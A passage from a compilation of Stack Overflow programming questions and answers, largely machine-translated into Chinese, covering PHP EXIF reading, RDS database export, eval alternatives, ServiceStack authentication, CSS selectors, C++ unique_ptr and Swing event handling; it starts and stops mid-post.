EXIF.FNumber: 9/1  
EXIF.ISOSpeedRatings: 400  
EXIF.ExifVersion: 0221  
EXIF.DateTimeOriginal: 2010:08:15 05:57:17  
EXIF.DateTimeDigitized: 2010:08:15 05:57:17 
EXIF.ShutterSpeedValue: 6643856/1000000   
EXIF.ApertureValue: 633985/100000  
EXIF.FocalLength: 1700/100  
EXIF.ColorSpace: 65535  
EXIF.ExifImageWidth: 700   
EXIF.ExifImageLength: 525 
```

为简洁起见，我省略了第二张照片中的数据。

以下是 $_FILES 的输出：

```
Array
(
    [userfile] => Array
        (
            [name] => Across the Field - LK.jpg
            [type] => image/jpeg
            [tmp_name] => C:\wamp\tmp\php223.tmp
            [error] => 0
            [size] => 294785
        )

    [userfile1] => Array
        (
            [name] => autumn-panorama - lk.jpg
            [type] => image/jpeg
            [tmp_name] => C:\wamp\tmp\php224.tmp
            [error] => 0
            [size] => 106349
        )
) 
```

我查看了每个站点和我能找到的每本书，以找到如何访问名称值对（例如 IFD0.ImageWidth: 1024 和 IFD0.ImageLength: 768 ），因此我可以设置对上传大小等的限制。

我现在很困惑，将不胜感激任何帮助或指导。特别感谢资源。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:23:25.900

好吧，该代码片段已经完成了这项工作，因此对于您的第一个文件，您应该能够执行以下操作。

```
$exif = exif_read_data($_FILES['userfile']['tmp_name'],  0, true);

if (isset($exif['IFD0']['ImageWidth']) && isset($exif['IFD0']['ImageLength']))
{
    // good to go!
    $width = $exif['IFD0']['ImageWidth'];
    $height = $exif['IFD0']['ImageLength'];
}
else
{
    // size data not present, fallback onto something else
    return;
} 
```

现在，话虽如此，您不应该**相信**exif 数据来进行约束验证！Exif 数据是元数据。它们很容易被欺骗/注入，或者根本不存在。而是通过首先检查文件大小本身，然后使用 getimagesize() 来分析实际的图像数据。见[http://www.php.net/manual/en/function.getimagesize.php](http://www.php.net/manual/en/function.getimagesize.php)

# java - GridBagConstraints insert a shifted column?

> ID：14916896
> 
> 赞同：0
> 
> 时间：2013-02-17T00:51:13.950
> 
> 标签：java, map, constraints, textures, gridbaglayout

I'm using GridBagLayout and GridBagConstraints to create a map (grid of texture)

![enter image description here](../Images/4df8eb5bf371ecc301125d9851c1634d.png)

but now I want to insert an edge between different texture: I want something like this

```
|-----|-----|-----|
|-----|-----|-----|
|----|-|----|-----|
|-----|-----|-----| 
```

i have tried:

```
c.gridx = i*5;
c.gridy = j*5;
c.gridwidth = 5;
c.gridheight = 5;

if(right != null && right != currentTexture)
    c.gridwidth--;
if(left != null && left != currentTexture){
    c.gridx = i*5+1;
    c.gridwidth--;
} 
```

but I'm getting this:

![enter image description here](../Images/093a43ef26bca1d68c3ff9ea4953d7cd.png)

I'm using the same texture, but I want them to be cut off 1 position at the edge

@ Code-Guru Thanks for your interest. I found a different way to solve my problem: that is, cutting the image with the BufferedImage. I'll post the change to my code:

```
ImageIcon tile = //get texture ...
Image img = tile.getImage();
BufferedImage buff = new BufferedImage(tile.getIconWidth(),tile.getIconHeight(), BufferedImage.TYPE_INT_RGB);
Graphics2D g = buff.createGraphics();
g.drawImage(img,0,0,null);

int w = tile.getIconWidth(), h = tile.getIconHeight();
int x = 0, y = 0;
c = new GridBagConstraints();
c.gridx = i*10;
c.gridy = j*10;
c.gridwidth = 10;
c.gridheight = 10;
c.fill = GridBagConstraints.NONE;

if(right != null && right != texture){
    //c.gridwidth--;
    c.anchor = GridBagConstraints.WEST;
    w -= (int)(res.ordinal()*2.5+2.5);
}
if(left != null && left != texture){
    //c.gridx = (i*10)+1;
    //c.gridwidth--;
    x = (int)(res.ordinal()*2.5+2.5);
    w -= (int)(res.ordinal()*2.5+2.5);
    if(c.anchor == GridBagConstraints.WEST)
        c.anchor = GridBagConstraints.CENTER;
    else
        c.anchor = GridBagConstraints.EAST;
}
BufferedImage buff2 = buff.getSubimage(x, y, w, h);
JLabel l = new JLabel(new ImageIcon(buff2));
globalMap.add(l, c); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:21:15.610

I think, you will need to start with a grid that has 5 columns per row. Then for each row, you will need to specify how many columns each cell will span.

For the first, second and fourth row in your example, the first cell spans two columns, the second cell spans two columns and the last cell only spans one column. For the third row, the first, third, and fourth cells span a single column and the second cell spans two columns.

p.s. You implement what I call "spanning" here by using the `gridwidth` member of your `GridBagConstraints` objects. You can set this with the constructor or directly.

# mysql - 下载 RDS 快照

> ID：14916899
> 
> 赞同：81
> 
> 时间：2013-02-17T00:51:56.183
> 
> 标签：mysql, amazon-web-services, amazon-rds

我最近降级了我的 EC2 实例。我无法再连接到 RDS。我认为可能是内部 IP 不同，现在登录名附加到该特定 IP。我一直无法弄清楚。我希望能够从快照中获取备份。有没有办法通过 AWS 下载它？

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2013-02-17T00:54:39.420

您无法下载 RDS 快照。但是，您可以连接到它并导出您的数据库。除非您错误地设置了安全组（将端口打开到 IP 而不是另一个安全组），否则降级您的实例不会影响连接。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2020-01-29T21:15:20.677

接受的答案不再是最新的。您可以使用 AWS 控制台，而不是使用命令行工具。

导航到 RDS -> 快照 -> 手动/系统 ->

**选择快照 -> 操作 -> 导出到 S3**

通过 S3 在大多数生产环境中很常见，因为您无法直接访问数据库实例。

[![具有导出到 S3 的 AWS RDS 控制台](../Images/a4e38720d8ce584cde5da7129ff9cda8.png)](https://i.stack.imgur.com/lf2B9.png)

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2017-05-21T10:44:09.730

除了[datasage](https://stackoverflow.com/users/790224/datasage)答案。

作为生产实例的一个选项，您可以在 RDS 中创建只读副本并从此副本进行转储。您可以通过这种方式避免冻结生产数据库。

我们将此方案用于 PostgreSQL + `pg_dump`。希望它对其他人也有帮助。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2019-10-07T11:00:32.030

我用：

`pg_dump -v -h RDS_URL -Fc -o -U username dbname > your_dump.sql`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-04-15T19:38:33.057

我还需要这样做，所以我通过登录到有权访问数据库的应用服务器来创建数据库（MySQL）的转储。然后我使用 scp 将转储下载到本地计算机。我用了：

```
mysqldump -uroot -p -h<HOST> --single-transaction <DBNAME> > output.sql 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-07-03T04:35:26.193

如果您不需要下载快照而只想与不同的 AWS 账户 ID 共享，另一种选择是[共享您的快照。](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-04-05T23:25:08.717

听起来您的 RDS 位于具有安全组和 ACL 的私有子网内的 VPC 内。解决您的问题的唯一方法是在允许所有连接的默认 VPC 中拍摄快照并从中创建一个新的数据库实例。之后，您使用数据库客户端或 CLI 进行备份经典备份。

# deployment - 如何在 SSIS 清单文件中仅包含选择性包以进行部署？

> ID：14916901
> 
> 赞同：1
> 
> 时间：2013-02-17T00:52:30.887
> 
> 标签：deployment, ssis, manifest

我最近开始通过导航到项目属性并将 Create Deployment Utility 设置为 true 来为 ETL 包构建清单文件。在此之前我使用批处理文件来部署软件包，但无法再运行它们，因为在新系统推出后我在服务器上没有足够的权限。

问题是在某些情况下，我只需要部署几个 ETL 包，而不是项目下的所有包。构建项目时，清单文件会列出项目下可能需要或不需要部署的所有包。

有什么办法让我只在清单文件中包含几个 ETL 包而不是项目下的每个包？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T22:52:54.457

根据 MSDN，可能的选项似乎是添加必要的包，这些包应该部署到不同的 SSIS 项目并在该项目上使用部署实用程序。

[*重新部署包*](http://msdn.microsoft.com/en-us/library/ms141124.aspx)

### 引用 MSDN：

完成更新包后，重新构建项目，将部署文件夹复制到目标计算机，然后重新运行包安装向导。

如果您只更新项目中的几个包，您可能不想重新部署整个项目。要仅部署几个包，您可以创建一个新的 Integration Services 项目，将更新的包添加到新项目中，然后构建和部署该项目。当您将包添加到不同的项目时，包配置会自动与包一起复制。

# javascript - Eval alternative

> ID：14916902
> 
> 赞同：1
> 
> 时间：2013-02-17T00:52:37.263
> 
> 标签：javascript, math, eval, calculator

This code works as a calculator, but the scratch pad at codeacademy tells me that eval is evil. Is there another way to do the same thing without using eval?

```
var calculate = prompt("Enter problem");
alert(eval(calculate)); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T01:07:03.983

`eval`将字符串输入评估为 JavaScript，巧合的是，JavaScript 支持计算和理解`1+1`，这使其适合用作计算器。

如果您不想使用`eval`，这很好，您必须自己解析该字符串，最后自己进行计算（虽然不完全是您自己）。看看[这个数学处理器](http://jsfromhell.com/classes/math-processor)，它可以满足你的需求。

基本上你要做的是：

1.  逐字符读取输入字符串（出现这种问题还是有可能的）
2.  构建您想要执行的操作树
3.  在字符串的末尾，您评估树并进行一些计算

例如，您有`"1+2/3"`，这可以评估为以下数据结构：

```
 "+"
     /  \
   "1"  "/"
       /   \
     "2"   "3" 
```

然后，您可以从上到下遍历该结构并进行计算。起初你有`"+"`，它的左边有一个 1 ，右边有一些表达式，所以你必须先评估那个表达式。所以你去`"/"`节点，它有两个数字孩子。知道了这一点，您现在可以计算`2/3`并用结果替换整个`"/"`节点。现在您可以再次向上计算“ `+`”节点的结果：`1 + 0.66`。现在你用结果替换那个节点，剩下的就是表达式的结果。

关于这在您的代码中的外观的一些伪代码：

```
calculation(operator, leftValue, rightValue):
   switch operator {
      case '+': return leftValue + rightValue
      case '-': return 42
   }

action(node):
   node.value = calculation(node.operator, action(node.left) action(node.right)) 
```

您可能已经注意到，树的设计方式是尊重运算符优先级。的`/`级别低于`+`，这意味着它首先得到评估。

无论您如何详细执行此操作，这基本上都是要走的路。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-28T12:48:07.950

您可以使用 math.js 库中包含的表达式解析器：

[http://mathjs.org](http://mathjs.org)

示例用法：

```
mathjs.evaluate('1.2 / (2.3 + 0.7)');   // 0.4
mathjs.evaluate('5.08 cm in inch');     // 2 inch
mathjs.evaluate('sin(45 deg) ^ 2');     // 0.5
mathjs.evaluate('9 / 3 + 2i');          // 3 + 2i
mathjs.evaluate('det([-1, 2; 3, 1])');  // -7 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-17T07:04:20.640

您可以通过过滤输入安全地将 eval 用于简单的算术计算器 - 如果您只接受数字、小数点和运算符（+、-、*、/），您不会遇到太多麻烦。如果您想要高级数学函数，最好使用解析器建议。

```
function calculate(){
    "use strict";
    var s= prompt('Enter problem');
    if(/[^0-9()*+\/ .-]+/.test(s)) throw Error('bad input...');
    try{
        var ans= eval(s);
    }
    catch(er){
        alert(er.message);
    }
    alert(ans);
}

calculate() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-16T16:56:17.697

当我遇到这样的问题时，我编写了一些函数。也许这可以帮助：

```
data = [
  {id:1,val1:"test",val2:"test2",val2:"test3"},
  {id:2,val1:"test",val2:"test2",val2:"test3"},
  {id:3,val1:"test",val2:"test2",val2:"test3"}
];
datakey = Object.keys(data[0]);
// here's a fix for e['datakey[f]'] >> e[x]
vix = function(e,f){
	a = "string";
	e[a] = datakey[f];
	x = e.string;
	end = e[x];
	delete e.string;
	return end;
};
// here's a fix to define that variable
vox = function(e,f,string){
	a = "string";
	e[a] = datakey[f];
	x = e.string;
	end = e[x] = string;
	delete e.string;
};
row = 2 // 3th row ==> {id:3,val1:"test",val2:"test2",val2:"test3"}
column = 1 //datakey 2 ==> val1
vox(data[row],column,"new value");
alert(data[2].val1); //the value that we have changed
```

# servicestack - 如何使用 ServiceStack、自己的用户存储库和设备 ID 对请求进行身份验证？

> ID：14916908
> 
> 赞同：8
> 
> 时间：2013-02-17T00:53:15.990
> 
> 标签：servicestack

我正在构建一个移动应用程序和一个 ServiceStack Web 服务后端。ServiceStack 中的 Authentication 东西看起来很棒，但很容易迷失在它的灵活性中——非常感谢指导。我将使用我自己的数据库表在 Web 服务中存储用户等。我想要一个注册过程和随后的身份验证，如下所示：

*   用户最初只提供一个电子邮件地址，然后我的网络服务通过电子邮件将注册密钥发送给用户
*   用户输入密钥。应用程序发送到网络服务进行注册：电子邮件、密钥和唯一的设备标识符。
*   Web 服务验证密钥并存储电子邮件和设备 ID。它使用应用程序将用于以后的身份验证的身份验证令牌进行响应。

然后后续的 Web 服务请求将提供设备 ID 和身份验证令牌（或使用它创建的哈希）。该应用程序不是很健谈，因此我很想在每个 Web 请求上发送身份验证详细信息。

**问题 1**：我应该挂钩到 ServiceStack 的注册 API 还是只添加几个自定义 Web 服务调用？例如，如果不使用 ServiceStack 的注册，我会：

*   使用电子邮件地址和设备 ID 发布到注册 Web 服务。我的 Web 服务将发送带有密钥的注册电子邮件并将记录添加到用户 db 表中。
*   当用户输入密钥时，它会再次发布到注册 Web 服务，这次也是使用密钥。我的 Web 服务将验证密钥并更新将用户标记为已注册的用户表，创建并记录身份验证令牌并将其返回给调用者
*   随后的请求将使用 http 基本身份验证发送，设备 ID 作为用户名，身份验证令牌作为密码。该服务不是很健谈，因此每个请求都会发送凭据。
*   我将实现一个 CredentialsAuthProvider，它将使用 httpRequest.GetBasicAuthUserAndPassword() 获取凭据，并根据 db 数据验证它们。

但感觉我应该使用内置到 ServiceStack 的注册。

**问题 2**：在每个请求中传递身份验证详细信息有什么问题？这将使编写我的应用程序请求更容易，但根据 ServiceStack 示例，它似乎没有“完成”。大概这是因为如果您有很多请求需要重新验证每个呼叫，那么效率会很低——还有其他原因吗？我的应用最多每隔几分钟只会发出一个 Web 请求，因此避免会话并重新验证每个请求似乎更简单。

**问题 3**：我是否在继承 CredentialsAuthProvider 的正确轨道上？

**问题 4**：使用 auth 令牌生成哈希而不是每次发送 auth 令牌有什么意义吗？所有通信都将通过 https。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-19T16:23:49.987

**答1：** 会好的。如果您根据要求拨打多个电话。通常身份验证基于 cookie，现在您可以将其存储在客户端和/或服务器上，并将用户与其匹配。再次在这里，如果您使用的是设备，您可以始终使用设备而不是用户来映射和验证用户。根据您的要求。

我更喜欢使用 provider，因为它隐藏了许多您需要手动执行的细节。你走在正确的轨道上。有许多专门针对身份验证以及如何使用服务堆栈创建自定义身份验证的博客。如果你喜欢让我知道我有书标记一些会给你。搜索最新版本的最佳方法是查看 Servicestack 的 Twitter 帐户。

**回答2：**这又是，我说根据要求。现在，如果您的用户将仅在 WIFI 区域中。（主要是商业用户），那么通话没有限制。只需调用 API 并在后台进行身份验证。简单的 JSON 令牌不会受到伤害，它只有几个字节。但同样，如果您的用户群很大，但没有使用良好的互联网连接，那么最好将身份验证详细信息存储在设备上并进行检查。只是为了节省网络通话。在任何情况下，网络调用都会占用大量资源。

**答案 3：**是的，您在正确的轨道上。仍然查看博客条目以获取更多详细信息。我不记得代码片段以及它如何与上次更新一起使用，所以我不在这里放代码。

**答案4：**这个答案有点复杂。通过 https 传递数据并将用户从身份欺诈中拯救出来几乎是不同的事情。现在，如果您没有生成身份验证令牌（基于哈希的值），那么您也可以通过 http 或 https 传递用户。现在，另一个用户可以使用它来模拟第一个用户并发送数据。甚至数据也通过 https 传递，但数据仍然被嘲笑。基于散列的值用于避免这种情况。还有其他几个业务用例可以使用 auth token 来覆盖。

请让我知道我是否正确理解了您的问题并回答了？或者如果需要任何进一步的细节？

# three.js - three.js 中的“纹理单元超出范围错误”会破坏应用程序吗？

> ID：14916910
> 
> 赞同：0
> 
> 时间：2013-02-17T00:53:36.140
> 
> 标签：three.js

我正在尝试通过 Jerome 为他的[live sparks editor](https://github.com/jeromeetienne/sparkseditor)制作的 THREEx.Sparks 模块在我的应用程序中使用 sparks.js 。但是，它仅适用于 r50 及以下的three.js——在此之后，火花轨迹永远不会被渲染。

我已经建立了一个（有点）最小的编辑器[分支](https://github.com/themasterchef/sparksjs-dev)供所有人使用。圆柱体总是被绘制出来，但是当我们逐步完成三个.js 修订时：

*   r46 有效，但现在当然已经过时了
*   r50 和 r49 按预期绘制粒子，但出现此 WebGL 错误：`WebGL: INVALID_ENUM: activeTexture: texture unit out of range`
*   从 r51 开始，不绘制火花的粒子系统

该错误很可能与 THREE 如何处理未正确初始化的纹理有关。我已经把它追到了在`_buildDefaultTexture`里面创建的 128x128 径向纹理`THREEx.Sparks.js`。

这是一个 SO 问题（而不是 GH 错误报告）的原因是，三个 r51+ 显然已经得到了正确的错误处理——他们甚至没有尝试不良行为，因为这使 WebGL 成为一个悲伤的熊猫，而 r50 及以下只是做了无论如何，它会导致错误。我的问题是：

*   **到底什么地方**做得`THREEx.Sparks.js`不好
*   **为什么**它在r51之前仍然有效

系统信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17 | WebGL 1.0 (OpenGL ES 2.0 Chromium) | 网络套件 | WebKit WebGL | WebGL GLSL ES 1.0（OpenGL ES GLSL ES 1.0 Chromium）

使用 r50 运行的 sparksjs-dev 的屏幕截图可在 i.stack.imgur.com/p5EfN.png 上查看（如果尚未拉出），其中显示了 WebGL 调试器中的错误`uniform1i`和`activeTexture`调用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T02:10:42.263

我无法为您调试代码，但我绝对可以为您指明正确的方向。

首先，请参阅[迁移 Wiki](https://github.com/mrdoob/three.js/wiki/Migration)以获取升级到当前版本的帮助。

例如，您将在 THREEx.Sparks.js 中看到，

```
texture : { type: "t", texture: this._texture } 
```

现在应该是

```
texture : { type: "t", value: this._texture } 
```

可能还有其他问题。

我无法评论旧版本的three.js，只能评论当前版本。

三.js r.55

# java - Filling in a blank space in relation to surrounding pixels

> ID：14916911
> 
> 赞同：0
> 
> 时间：2013-02-17T00:53:50.790
> 
> 标签：java, image-processing, coordinates, bufferedimage

I am currently working on a program that preforms techniques such as image segmentation along with a few others. However I have the task ahead of me of filling a segmented area (this will be a blank area) based on its surrounding pixels.

This is a lot like what photoshop likes to call [content aware fill](http://www.youtube.com/watch?v=WJblbu4g_xQ), however me being only one person am wondering the best way I could approach this type task. Also how I should start to think about getting something, obviously not as technical and robust, but similar in some sense to work.

I am not currently aware of any classes that may help with something like this but any help on this would be greatly appreciated.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T14:57:33.090

你在[Inpainting](http://en.wikipedia.org/wiki/Inpainting)之后。有很多方法可以做到这一点， Bertalmío、Caselles、Masnou、Sapiro - 2011 年的 Inpainting[调查](http://math.univ-lyon1.fr/~masnou/fichiers/publications/survey.pdf)提供了许多关于它们的结果和参考。

在这里，您还可以找到使用该技术的示例结果，例如在[https://stackoverflow.com/a/13666082/1832154](https://stackoverflow.com/a/13666082/1832154)您将看到一个与[http://www.cc.gatech.edu/~sooraj/inpainting /](http://www.cc.gatech.edu/~sooraj/inpainting/)给出了一个完整的实现。在[https://stackoverflow.com/a/14295915/1832154](https://stackoverflow.com/a/14295915/1832154)，您可以看到另一个示例结果，以及对不同修复方法的简单引用。

# matlab - calculating x2 from poisson distributed data

> ID：14916912
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:53:57.687
> 
> 标签：matlab, statistics

So I have a table of values

```
v=0 1 2 3 4 5 6 7 8 9
#times obs.: 5 19 23 21 14 12 3 2 1 0 
```

I am supposed to calculate chi squared assuming the data fits a poisson dist. with mean u=3. I have to group values >=6 all in one bin.

I am unsure of how to plot the poisson dist., and most of all how to control what goes into what bin, if that makes sense.

I have plotted a histogram using histc before..but it was with random numbers that I normalized. The amount in each bin was set for me. I am super new...sorry if this question sucks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:03:32.107

您用于`bar`在 matlab 中绘制条形图。

所以这就是你要做的：

```
v=0:9;
f=[5 19 23 21 14 12 3 2 1 0];
fc=f(find(v<6));      % copy elements where v<=6 into a new array
fc(end+1)=sum(f(v=>6)); % append the sum of elements where v=>6 to that array
figure
bar(v(v<=6), fc); 
```

这应该够了吧...

现在您实际上并没有询问卡方计算。我敦促您不要将 v>6 的值全部放入一个 bin 进行计算，因为它会给您带来非常糟糕的结果。

还有另一种技巧：如果你使用这个`hist`函数，你可以选择垃圾箱——Matlab 会自动将超出限制的东西放入最后一个垃圾箱。因此，如果您的观察结果在数组`Obs`中，您可以执行以下操作：

```
h = hist(Obs, 0:6);
figure
bar(0:6, h) 
```

优点是您可以使用数组`h`（频率）进行其他计算。

如果你这样做

```
hist(Obs, 0:6) 
```

Matlab 将在单个语句中为您绘制图形（但您没有值...）

# javascript - 在 HTML5 视频中切换隐藏式字幕并禁用默认视频控件

> ID：14916914
> 
> 赞同：12
> 
> 时间：2013-02-17T00:54:06.990
> 
> 标签：javascript, html, html5-video, closed-captions

我有两个问题。一旦我将轨道标签放在我的视频元素中，视频的默认控制器就会显示出来。我有自定义控件，所以这是个很大的问题。

第二。我找不到关闭字幕的方法。

HTML：

```
<video id="trailers" poster="images/poster/poster.jpg">
                <source src="media/vLast.mp4" type="video/mp4">
                <source src="media/vLast.webm" type="video/webm">
                <track id="mytrack" label="English Subtitles" src="subtitles.vtt" srclang="en" default />
 </video> 

 <button id="cc">CC</button> 
```

JS：

```
 var cc = document.getElementById('cc');
function cc(){
       var video= document.getElementById('media');
       var track1 = video.textTracks[0];
       var mytrack = document.getElementById('mytrack');
       var track2 = mytrack.track;
       console.log(track1);
       console.log(track2);
    }
    cc.addEventListener('click',cc,false); 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-02-17T03:28:26.603

`controls`如果您在标签中删除任何`<video>`应保持控件隐藏的引用（它们可能会在首次加载时闪烁，但一旦加载视频，它们将保持隐藏状态）该`controls`项目是布尔值：如果它存在，那么它们将显示，如果它不'然后他们不会。

要显示和隐藏字幕，您需要将其设置`mode`为“显示”或“隐藏”，如下所示

```
<video autoplay loop id="v">
    <source src="Video.mp4" type="video/mp4">
    <track id="enTrack" src="entrack.vtt" label="English" kind="subtitles" srclang="en" default> 
    HTML5 video not supported
</video>
.
.
.  
<script>
.
v = document.getElementById("v")
v.textTracks[0].mode = "hidden";  // "showing" will make them reappear
    // if you want to show the controls
v.controls = true;
.
</script> 
```

请注意，YMMV 作为不同的浏览器在字幕方面有不同的行为。这适用于 OSX 和 IE10 上的 Chrome/Safari（尽管在 Safari 和 IE 上注意模式的值是“0”表示隐藏，“2”表示显示，但使用文本设置它们似乎有效。尚未在 iOS 上测试

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-22T20:34:40.037

要完全禁用控件显示（对于 webkit 浏览器 - chrome、safari 等），您还可以添加以下 css 以避免原始控件的“闪烁”效果。

```
::-webkit-media-controls {
  display:none !important;
}
video::-webkit-media-controls {
  display:none !important;
}
video::-webkit-media-controls-enclosure {
  display:none !important;
} 
```

# html - Css selector

> ID：14916920
> 
> 赞同：-1
> 
> 时间：2013-02-17T00:55:15.033
> 
> 标签：html, css, css-selectors

What is the selector to reach the ul markups highlighted below? (no class or id is possible i need a selector to the html markup)

Here is my html code:

```
<div id="mainmenu">
  <ul class="menu">
    <li class="item-472">
        <a href="#">Accueil</a>
    </li>
    <li class="item-475 current active deeper parent">
      <a href="#" class="drop">Produits</a>  
        **<ul> <!--Here is the first ul I'm tryin to style --> **  
            <li class="item-519 deeper parent" >
            <h3>Fenêtres</h3>
            <p>PVC</p>
            <a href="#">Fenêtres</a>
           ** <ul> <!-- the second ul to style -->**
                <li class="item-521 deeper parent">
                    <a href="#">PVC</a>
                    <ul >
                        <li class="item-522"><a href="#">Arcade</a></li>
                    </ul>
                </li>
            </ul>
            </li>
        </ul>
    </li> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:56:33.097

There are a number of ways to style these unordered lists, depending on how specific you want your selectors to be. I have created a somewhat comprehensive list below.

Ways to select the first `ul`:

*   `ul`
*   `li ul`
*   `ul li ul`
*   `ul .item-475 ul`
*   `ul .current ul`
*   `ul .active ul`
*   `ul .deeper ul`
*   `ul .parent ul`

Ways to select the second `ul`:

*   `ul ul`
*   `li ul ul`
*   `ul li ul ul`
*   `ul .item-475 ul ul`
*   `ul .current ul ul`
*   `ul .active ul ul`
*   `ul .deeper ul ul`
*   `ul .parent ul ul`

**IMPORTANT:** Be sure that the second `ul` is either as specific or more specific than the first `ul`. Otherwise, the style of the first `ul` will be applied to the second `ul`.

For example, [this would work](http://jsfiddle.net/M3KRP/1/):

```
li ul {
    /* styles here */
}

ul .current ul ul {
    /* styles here */
} 
```

But [this would NOT work](http://jsfiddle.net/M3KRP/2/):

```
ul .current ul {
    /* styles here */
}

ul ul {
    /* styles here */
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-17T00:56:52.417

first one:

```
li.active ul 
```

second one:

```
li.active ul ul 
```

[http://jsfiddle.net/YYsZ3/](http://jsfiddle.net/YYsZ3/)

# php - 如何按组中的其他列排序？

> ID：14916925
> 
> 赞同：2
> 
> 时间：2013-02-17T00:56:10.917
> 
> 标签：php, mysql, sql, database

我有以下文章mysql表：

```
id | date
 1 | 2013-02-16 00:00:00
 2 | 2013-02-17 00:00:00 
```

我想获得一个逗号分隔的 ids (1,2) 和最后一个日期值 (2013-02-17 00:00:00) 列表

我使用以下查询：

```
SELECT GROUP_CONCAT(id),date FROM articles ORDER BY date DESC 
```

查询选择它遇到的第一个日期值（2013-02-16 00:00:00），如何让它选择最后一个？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:58:47.890

```
select group_concat(id), 
       max(date) as max_date
from your_table 
```

[SQLFiddle 演示](http://sqlfiddle.com/#!2/2b85e/2)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T01:15:57.927

怎么用`MAX`：

```
SELECT GROUP_CONCAT(id),MAX(date) 
FROM articles 
```

和小提琴：[http ://sqlfiddle.com/#!2/4e957/3](http://sqlfiddle.com/#!2/4e957/3)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T00:57:37.720

用这个：

```
SELECT GROUP_CONCAT(id),date FROM articles ORDER BY date ASC 
```

# c++ - Missing unique_ptr and friends operator= overload

> ID：14916931
> 
> 赞同：1
> 
> 时间：2013-02-17T00:57:04.817
> 
> 标签：c++, c++11, std

I know this kind of questions aren't really welcome here but I must ask: why don't unique_ptr/shared_ptr/etc have an operator= overload for type T?

It would seem more natural to write

```
std::unique_ptr<int> p = new int(5); 
```

instead of

```
std::unique_ptr<int> p(new int(5)); 
```

or any other more verbose method.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T01:07:50.643

如果你被允许写这个：

```
std::unique_ptr<int> p = new int(5); 
```

然后你也可以写这些：

```
void Func1(std::unique_ptr<int> p);

Func1(new int(5));

std::unique_ptr<int> Func2() {return new int(5);} 
```

或者更危险的：

```
void Func1(std::unique_ptr<int> p);

int *pInt = new int(5);
Func1(pInt); //You no longer own the pointer anymore.
delete pInt; //You're now deleting a pointer you don't own. 
```

由于显而易见的原因，这是不可接受的。他们不希望从裸指针隐式转换为唯一指针；如果您想创建一个`unique_ptr`，您必须明确说明：`Func1(std::unique_ptr<int>(pInt));`现在，每个人都可以看到您正在将所有权从您自己转移到该函数。

此外，它`operator=`不会使这个工作。它的`explicit`单参数构造函数`unique_ptr`阻止了复制初始化语法的工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T01:18:18.557

What you're referring to is the fact that the constructor of `unique_ptr<T>` that takes a raw `T` pointer is *explicit*. This is deliberate. A unique pointer *takes ownership*, and that should not happen implicitly. The user should always know explicitly when ownership is created, transferred and ended.

In a more draconian world one could imagine a `unique_ptr` that doesn't take *any* raw pointers at all, and instead only allows direct creation of the owned object:

```
auto p = std::unique_ptr<T>::make(arg1, arg2, arg3);
                             // Calls "new T(arg1, arg2, arg3)".
                             // Not real code. 
```

# java - 如何将 ActionPerformed 从 ActionListener 发送到另一个 ActionListener？

> ID：14916936
> 
> 赞同：0
> 
> 时间：2013-02-17T00:57:40.263
> 
> 标签：java, swing, actionlistener

我有一个 Frame（此处命名为“MainApplication”），它主要有一个 JPanel 来显示信息，具体取决于上下文。

启动时，MainApplication 有一个空的 JPanel。

然后它创建一个“LoginRequest”类，该类创建一个简单的登录/密码表单，并将其发送回 MainApplication，后者将其显示在其 JPanel 中。

“LoginRequest”类实现了 ActionListener，所以当用户点击“Login”按钮时，它会检查登录名/密码是否正确，如果用户被授予，我想卸载该表单，并显示MainApplication Frame 上的主屏幕。

所以，要做到这一点，我想出了这个：

```
public class LoginRequest implements ActionListener {

    protected MainApplication owner_m = null;

    public LoginRequest(MainApplication owner_p) {
            owner_m = owner_p;
    }

    @Override
    public void actionPerformed(ActionEvent event_p) {

        // the user just clicked the "Login" button
        if (event_p.getActionCommand().equals("RequestLogin")) {

            // check if login/password are correct
            if (getParameters().isUserGranted(login_l, password_l)) {

                // send an ActionEvent to the "MainApplication", so as it will
                // be notified to display the next screen
                this.owner_m.actionPerformed(
                    new java.awt.event.ActionEvent(this, 0, "ShowSummary")
                );
            } else {
                messageLabel_m.setForeground(Color.RED);
                messageLabel_m.setText("Incorrect user or password");
            }
        }
    }
} 
```

然后，“MainApplication”类（扩展 JFrame）：

```
public class MainApplication extends JFrame implements ActionListener {

    protected void load() {
            // create the panel to display information
            mainPanel_m = new JPanel();
            // on startup, populate the panel with a login/password form
            mainPanel_m.add(new LoginRequest(this).getLoginForm());

            this.add(mainPanel_m);
    }

    @Override
    public void actionPerformed(ActionEvent event_p) {
        // show summary on request
        if (event_p.getActionCommand().equals("ShowSummary")) {

            // remove the previous information on the panel
            // (which displayed the login form on this example)
